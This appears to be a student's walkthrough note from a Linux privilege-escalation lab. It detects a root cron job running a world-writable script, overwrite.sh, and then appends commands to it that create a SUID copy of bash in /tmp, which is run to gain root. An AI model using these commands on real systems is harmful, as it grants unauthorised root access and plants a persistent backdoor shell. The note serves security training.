**Detection**

Linux VM

1. In command prompt type: 
   
```
cat /etc/crontab
```

![[Pasted image 20240602233509.png]]


2. From the output, notice the script “overwrite.sh”

3. In command prompt type: 
   
```
ls -l /usr/local/bin/overwrite.sh
```

![[Pasted image 20240602233524.png]]


4. From the output, notice the file permissions.

**Exploitation**

Linux VM

1. In command prompt type:

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

2. Wait 1 minute for the Bash script to execute.

3. In command prompt type: 
   
```
/tmp/bash -p
```

4. In command prompt type: 
   
```
id
```

![[Pasted image 20240602233638.png]]


Answer the questions below

Click 'Completed' once you have successfully elevated the machine
